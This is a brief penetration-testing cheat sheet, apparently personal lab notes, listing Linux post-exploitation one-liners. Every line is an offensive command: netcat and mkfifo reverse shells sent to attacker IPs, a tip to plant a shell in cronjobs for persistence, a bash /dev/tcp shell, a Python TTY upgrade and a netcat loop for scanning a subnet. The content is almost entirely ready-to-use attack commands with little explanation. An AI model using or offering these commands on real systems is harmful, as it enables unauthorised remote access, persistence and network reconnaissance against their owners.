- Can't get a bash shell? Try `which netcat` and `netcat <ip> <port> -e /bin/bash`
- Use this to spawn a shell too. Can append to Cronjobs etc
	- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f`
- Vanialla shell `bash -i >& /dev/tcp/192.168.45.231/9001 0>&1`
- Upgrade to TTY shell `python3 -c 'import pty; pty.spawn("/bin/bash")`
- If there's no portscanner on a host and you want to portscan a subnet `for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done`
